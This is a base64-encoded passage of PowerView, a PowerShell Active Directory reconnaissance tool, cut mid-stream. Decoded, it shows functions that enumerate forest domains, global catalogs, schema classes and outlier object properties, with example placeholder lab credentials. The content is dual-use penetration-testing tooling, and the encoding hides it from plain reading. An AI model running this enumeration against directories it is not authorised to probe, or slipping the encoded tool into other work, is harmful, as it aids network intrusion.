hlIHRhcmdldCBmb3Jlc3QuCgouRVhBTVBMRQoKR2V0LUZvcmVzdERvbWFpbgoKLkVYQU1QTEUKCkdldC1Gb3Jlc3REb21haW4gLUZvcmVzdCBleHRlcm5hbC5sb2NhbAoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Gb3Jlc3REb21haW4gLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Eb21haW4nKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGb3Jlc3QsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIFBST0NFU1MgewogICAgICAgICRBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGb3Jlc3QnXSkgeyAkQXJndW1lbnRzWydGb3Jlc3QnXSA9ICRGb3Jlc3QgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgICRGb3Jlc3RPYmplY3QgPSBHZXQtRm9yZXN0IEBBcmd1bWVudHMKICAgICAgICBpZiAoJEZvcmVzdE9iamVjdCkgewogICAgICAgICAgICAkRm9yZXN0T2JqZWN0LkRvbWFpbnMKICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRm9yZXN0R2xvYmFsQ2F0YWxvZyB7CjwjCi5TWU5PUFNJUwoKUmV0dXJuIGFsbCBnbG9iYWwgY2F0YWxvZ3MgZm9yIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGZvcmVzdC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LUZvcmVzdCAgCgouREVTQ1JJUFRJT04KClJldHVybnMgYWxsIGdsb2JhbCBjYXRhbG9ncyBmb3IgdGhlIGN1cnJlbnQgZm9yZXN0IG9yIHRoZSBmb3Jlc3Qgc3BlY2lmaWVkCmJ5IC1Gb3Jlc3QgWCBieSB1c2luZyBHZXQtRm9yZXN0IHRvIHJldHJpZXZlIHRoZSBzcGVjaWZpZWQgZm9yZXN0IG9iamVjdAphbmQgdGhlIC5GaW5kQWxsR2xvYmFsQ2F0YWxvZ3MoKSB0byBlbnVtZXJhdGUgdGhlIGdsb2JhbCBjYXRhbG9ncy4KCi5QQVJBTUVURVIgRm9yZXN0CgpTcGVjaWZpZXMgdGhlIGZvcmVzdCBuYW1lIHRvIHF1ZXJ5IGZvciBnbG9iYWwgY2F0YWxvZ3MuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKR2V0LUZvcmVzdEdsb2JhbENhdGFsb2cKCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtRm9yZXN0R2xvYmFsQ2F0YWxvZyAtQ3JlZGVudGlhbCAkQ3JlZAoKLk9VVFBVVFMKClN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuR2xvYmFsQ2F0YWxvZwojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5HbG9iYWxDYXRhbG9nJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRm9yZXN0LAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBQUk9DRVNTIHsKICAgICAgICAkQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRm9yZXN0J10pIHsgJEFyZ3VtZW50c1snRm9yZXN0J10gPSAkRm9yZXN0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAkRm9yZXN0T2JqZWN0ID0gR2V0LUZvcmVzdCBAQXJndW1lbnRzCgogICAgICAgIGlmICgkRm9yZXN0T2JqZWN0KSB7CiAgICAgICAgICAgICRGb3Jlc3RPYmplY3QuRmluZEFsbEdsb2JhbENhdGFsb2dzKCkKICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRm9yZXN0U2NoZW1hQ2xhc3Mgewo8IwouU1lOT1BTSVMKCkhlbHBlciB0aGF0IHJldHVybnMgdGhlIEFjdGl2ZSBEaXJlY3Rvcnkgc2NoZW1hIGNsYXNzZXMgZm9yIHRoZSBjdXJyZW50CihvciBzcGVjaWZpZWQpIGZvcmVzdCBvciByZXR1cm5zIGp1c3QgdGhlIHNjaGVtYSBjbGFzcyBzcGVjaWZpZWQgYnkKLUNsYXNzTmFtZSBYLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRm9yZXN0ICAKCi5ERVNDUklQVElPTgoKVXNlcyBHZXQtRm9yZXN0IHRvIHJldHJpZXZlIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGZvcmVzdC4gQnkgZGVmYXVsdCwKdGhlIC5GaW5kQWxsQ2xhc3NlcygpIG1ldGhvZCBpcyBleGVjdXRlZCwgcmV0dXJuaW5nIGEgY29sbGVjdGlvbiBvZgpbRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkFjdGl2ZURpcmVjdG9yeVNjaGVtYUNsYXNzXSByZXN1bHRzLgpJZiAiLUZpbmRDbGFzcyBYIiBpcyBzcGVjaWZpZWQsIHRoZSBbRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkFjdGl2ZURpcmVjdG9yeVNjaGVtYUNsYXNzXQpyZXN1bHQgZm9yIHRoZSBzcGVjaWZpZWQgY2xhc3MgbmFtZSBpcyByZXR1cm5lZC4KCi5QQVJBTUVURVIgQ2xhc3NOYW1lCgpTcGVjaWZpZXMgYSBBY3RpdmVEaXJlY3RvcnlTY2hlbWFDbGFzcyBuYW1lIGluIHRoZSBmb3VuZCBzY2hlbWEgdG8gcmV0dXJuLgoKLlBBUkFNRVRFUiBGb3Jlc3QKClRoZSBmb3Jlc3QgdG8gcXVlcnkgZm9yIHRoZSBzY2hlbWEsIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGZvcmVzdC4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRm9yZXN0U2NoZW1hQ2xhc3MKClJldHVybnMgYWxsIGRvbWFpbiBzY2hlbWEgY2xhc3NlcyBmb3IgdGhlIGN1cnJlbnQgZm9yZXN0LgoKLkVYQU1QTEUKCkdldC1Gb3Jlc3RTY2hlbWFDbGFzcyAtRm9yZXN0IGRldi50ZXN0bGFiLmxvY2FsCgpSZXR1cm5zIGFsbCBkb21haW4gc2NoZW1hIGNsYXNzZXMgZm9yIHRoZSBleHRlcm5hbC5sb2NhbCBmb3Jlc3QuCgouRVhBTVBMRQoKR2V0LUZvcmVzdFNjaGVtYUNsYXNzIC1DbGFzc05hbWUgdXNlciAtRm9yZXN0IGV4dGVybmFsLmxvY2FsCgpSZXR1cm5zIHRoZSB1c2VyIHNjaGVtYSBjbGFzcyBmb3IgdGhlIGV4dGVybmFsLmxvY2FsIGRvbWFpbi4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtRm9yZXN0U2NoZW1hQ2xhc3MgLUNsYXNzTmFtZSB1c2VyIC1Gb3Jlc3QgZXh0ZXJuYWwubG9jYWwgLUNyZWRlbnRpYWwgJENyZWQKClJldHVybnMgdGhlIHVzZXIgc2NoZW1hIGNsYXNzIGZvciB0aGUgZXh0ZXJuYWwubG9jYWwgZG9tYWluIHVzaW5nCnRoZSBzcGVjaWZpZWQgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzLgoKLk9VVFBVVFMKCltEaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuQWN0aXZlRGlyZWN0b3J5U2NoZW1hQ2xhc3NdCgpBbiBBY3RpdmVEaXJlY3RvcnlTY2hlbWFDbGFzcyByZXR1cm5lZCBmcm9tIHRoZSBmb3VuZCBzY2hlbWEuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkFjdGl2ZURpcmVjdG9yeVNjaGVtYUNsYXNzXSldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnQ2xhc3MnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ2xhc3NOYW1lLAoKICAgICAgICBbQWxpYXMoJ05hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEZvcmVzdCwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgUFJPQ0VTUyB7CiAgICAgICAgJEFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZvcmVzdCddKSB7ICRBcmd1bWVudHNbJ0ZvcmVzdCddID0gJEZvcmVzdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgJEZvcmVzdE9iamVjdCA9IEdldC1Gb3Jlc3QgQEFyZ3VtZW50cwoKICAgICAgICBpZiAoJEZvcmVzdE9iamVjdCkgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDbGFzc05hbWUnXSkgewogICAgICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENsYXNzIGluICRDbGFzc05hbWUpIHsKICAgICAgICAgICAgICAgICAgICAkRm9yZXN0T2JqZWN0LlNjaGVtYS5GaW5kQ2xhc3MoJFRhcmdldENsYXNzKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJEZvcmVzdE9iamVjdC5TY2hlbWEuRmluZEFsbENsYXNzZXMoKQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gRmluZC1Eb21haW5PYmplY3RQcm9wZXJ0eU91dGxpZXIgewo8IwouU1lOT1BTSVMKCkZpbmRzIHVzZXIvZ3JvdXAvY29tcHV0ZXIgb2JqZWN0cyBpbiBBRCB0aGF0IGhhdmUgJ291dGxpZXInIHByb3BlcnRpZXMgc2V0LgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpLCBNYXR0aGV3IEdyYWViZXIgKEBtYXR0aWZlc3RhdGlvbikgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW4sIEdldC1Eb21haW5Vc2VyLCBHZXQtRG9tYWluR3JvdXAsIEdldC1Eb21haW5Db21wdXRlcgoKLkRFU0NSSVBUSU9OCgpBICdyZWZlcmVuY2UnIHNldCBvZiBwcm9wZXJ0eSBuYW1lcyBpcyBjYWxjdWxhdGVkLCBlaXRoZXIgZnJvbSBhIHN0YW5kYXJkIHNldCBwcmVzZXJ2ZWQKZm9yIHVzZXIvZ3JvdXAvY29tcHV0ZXJzLCBvciBmcm9tIHRoZSBhcnJheSBvZiBuYW1lcyBwYXNzZWQgdG8gLVJlZmVyZW5jZVByb3BlcnR5U2V0LCBvcgpmcm9tIHRoZSBwcm9wZXJ0eSBuYW1lcyBvZiB0aGUgcGFzc2VkIC1SZWZlcmVuY2VPYmplY3QuIEV2ZXJ5IHVzZXIvZ3JvdXAvY29tcHV0ZXIgb2JqZWN0CihkZXBlbmRpbmcgb24gZGV0ZXJtaW5lZCBjbGFzcykgYXJlIGVudW1lcmF0ZWQsIGFuZCBmb3IgZWFjaCBvYmplY3QsIGlmIHRoZSBvYmplY3QgaGFzIGEKJ25vbi1zdGFuZGFyZCcgcHJvcGVydHkgc2V0IChtZWFuaW5nIGEgcHJvcGVydHkgbm90IGhlbGQgYnkgdGhlIHJlZmVyZW5jZSBzZXQpLCB0aGUgb2JqZWN0J3MKc2FtQWNjb3VudE5hbWUsIHByb3BlcnR5IG5hbWUsIGFuZCBwcm9wZXJ0eSB2YWx1ZSBhcmUgb3V0cHV0IHRvIHRoZSBwaXBlbGluZS4KCi5QQVJBTUVURVIgQ2xhc3NOYW1lCgpTcGVjaWZpZXMgdGhlIEFEIG9iamVjdCBjbGFzcyB0byBmaW5kIHByb3BlcnR5IG91dGxpZXJzIGZvciwgJ3VzZXInLCAnZ3JvdXAnLCBvciAnY29tcHV0ZXInLgpJZiAtUmVmZXJlbmNlT2JqZWN0IGlzIHNwZWNpZmllZCwgdGhpcyB3aWxsIGJlIGF1dG9tYXRpY2FsbHkgZXh0cmFjdGVkLCBpZiBwb3NzaWJsZS4KCi5QQVJBTUVURVIgUmVmZXJlbmNlUHJvcGVydHlTZXQKClNwZWNpZmllcyBhbiBhcnJheSBvZiBwcm9wZXJ0eSBuYW1lcyB0byBkaWZmIGFnYWluc3QgdGhlIGNsYXNzIHNjaGVtYS4KCi5QQVJBTUVURVIgUmVmZXJlbmNlT2JqZWN0CgpTcGVjaWNpZmVzIHRoZSBQb3dlclZpZXcgdXNlci9ncm91cC9jb21wdXRlciBvYmplY3QgdG8gZXh0cmFjdCBwcm9wZXJ0eSBuYW1lcwpmcm9tIHRvIHVzZSBhcyB0aGUgcmVmZXJlbmNlIHNldC4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyIC1DbGFzc05hbWUgJ1VzZXInCgpFbnVtZXJhdGVzIHVzZXJzIGluIHRoZSBjdXJyZW50IGRvbWFpbiB3aXRoICdvdXRsaWVyJyBwcm9wZXJ0aWVzIGZpbGxlZCBpbi4KCi5FWEFNUExFCgpGaW5kLURvbWFpbk9iamVjdFByb3BlcnR5T3V0bGllciAtQ2xhc3NOYW1lICdHcm91cCcgLURvbWFpbiBleHRlcm5hbC5sb2NhbAoKRW51bWVyYXRlcyBncm91cHMgaW4gdGhlIGV4dGVybmFsLmxvY2FsIGZvcmVzdC9kb21haW4gd2l0aCAnb3V0bGllcicgcHJvcGVydGllcyBmaWxsZWQgaW4uCgouRVhBTVBMRQoKR2V0LURvbWFpbkNvbXB1dGVyIC1GaW5kT25lIHwgRmluZC1Eb21haW5PYmplY3RQcm9wZXJ0eU91dGxpZXIKCkVudW1lcmF0ZXMgY29tcHV0ZXJzIGluIHRoZSBjdXJyZW50IGRvbWFpbiB3aXRoICdvdXRsaWVyJyBwcm9wZXJ0aWVzIGZpbGxlZCBpbi4KCi5PVVRQVVRTCgpQb3dlclZpZXcuUHJvcGVydHlPdXRsaWVyCgpDdXN0b20gUFNPYmplY3Qgd2l0aCB0cmFuc2xhdGVkIG9iamVjdCBwcm9wZXJ0eSBvdXRsaWVycy4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Qcm9wZXJ0eU91dGxpZXInKV0KICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ0NsYXNzTmFtZScpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0NsYXNzTmFtZScpXQogICAgICAgIFtBbGlhcygnQ2xhc3MnKV0KICAgICAgICBbVmFsaWRhdGVTZXQoJ1VzZXInLCAnR3JvdXAnLCAnQ29tcHV0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDbGFzc05hbWUsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRSZWZlcmVuY2VQcm9wZXJ0eVNldCwKCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdSZWZlcmVuY2VPYmplY3QnKV0KICAgICAgICBbUFNDdXN0b21PYmplY3RdCiAgICAgICAgJFJlZmVyZW5jZU9iamVjdCwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgICRVc2VyUmVmZXJlbmNlUHJvcGVydHlTZXQgPSBAKCdhZG1pbmNvdW50JywnYWNjb3VudGV4cGlyZXMnLCdiYWRwYXNzd29yZHRpbWUnLCdiYWRwd2Rjb3VudCcsJ2NuJywnY29kZXBhZ2UnLCdjb3VudHJ5Y29kZScsJ2Rlc2NyaXB0aW9uJywgJ2Rpc3BsYXluYW1lJywnZGlzdGluZ3Vpc2hlZG5hbWUnLCdkc2NvcmVwcm9wYWdhdGlvbmRhdGEnLCdnaXZlbm5hbWUnLCdpbnN0YW5jZXR5cGUnLCdpc2NyaXRpY2Fsc3lzdGVtb2JqZWN0JywnbGFzdGxvZ29mZicsJ2xhc3Rsb2dvbicsJ2xhc3Rsb2dvbnRpbWVzdGFtcCcsJ2xvY2tvdXR0aW1lJywnbG9nb25jb3VudCcsJ21lbWJlcm9mJywnbXNkcy1zdXBwb3J0ZWRlbmNyeXB0aW9udHlwZXMnLCduYW1lJywnb2JqZWN0Y2F0ZWdvcnknLCdvYmplY3RjbGFzcycsJ29iamVjdGd1aWQnLCdvYmplY3RzaWQnLCdwcmltYXJ5Z3JvdXBpZCcsJ3B3ZGxhc3RzZXQnLCdzYW1hY2NvdW50bmFtZScsJ3NhbWFjY291bnR0eXBlJywnc24nLCd1c2VyYWNjb3VudGNvbnRyb2wnLCd1c2VycHJpbmNpcGFsbmFtZScsJ3VzbmNoYW5nZWQnLCd1c25jcmVhdGVkJywnd2hlbmNoYW5nZWQnLCd3aGVuY3JlYXRlZCcpCgogICAgICAgICRHcm91cFJlZmVyZW5jZVByb3BlcnR5U2V0ID0gQCgnYWRtaW5jb3VudCcsJ2NuJywnZGVzY3JpcHRpb24nLCdkaXN0aW5ndWlzaGVkbmFtZScsJ2RzY29yZXByb3BhZ2F0aW9uZGF0YScsJ2dyb3VwdHlwZScsJ2luc3RhbmNldHlwZScsJ2lzY3JpdGljYWxzeXN0ZW1vYmplY3QnLCdtZW1iZXInLCdtZW1iZXJvZicsJ25hbWUnLCdvYmplY3RjYXRlZ29yeScsJ29iamVjdGNsYXNzJywnb2JqZWN0Z3VpZCcsJ29iamVjdHNpZCcsJ3NhbWFjY291bnRuYW1lJywnc2FtYWNjb3VudHR5cGUnLCdzeXN0ZW1mbGFncycsJ3VzbmNoYW5nZWQnLCd1c25jcmVhdGVkJywnd2hlbmNoYW5nZWQnLCd3aGVuY3JlYXRlZCcpCgogICAgICAgICRDb21wdXRlclJlZmVyZW5jZVByb3BlcnR5U2V0ID0gQCgnYWNjb3VudGV4cGlyZXMnLCdiYWRwYXNzd29yZHRpbWUnLCdiYWRwd2Rjb3VudCcsJ2NuJywnY29kZXBhZ2UnLCdjb3VudHJ5Y29kZScsJ2Rpc3Rpbmd1aXNoZWRuYW1lJywnZG5zaG9zdG5hbWUnLCdkc2NvcmVwcm9wYWdhdGlvbmRhdGEnLCdpbnN0YW5jZXR5cGUnLCdpc2NyaXRpY2Fsc3lzdGVtb2JqZWN0JywnbGFzdGxvZ29mZicsJ2xhc3Rsb2dvbicsJ2xhc3Rsb2dvbnRpbWVzdGFtcCcsJ2xvY2FscG9saWN5ZmxhZ3MnLCdsb2dvbmNvdW50JywnbXNkcy1zdXBwb3J0ZWRlbmNyeXB0aW9udHlwZXMnLCduYW1lJywnb2JqZWN0Y2F0ZWdvcnknLCdvYmplY3RjbGFzcycsJ29iamVjdGd1aWQnLCdvYmplY3RzaWQnLCdvcGVyYXRpbmdzeXN0ZW0nLCdvcGVyYXRpbmdzeXN0ZW1zZXJ2aWNlcGFjaycsJ29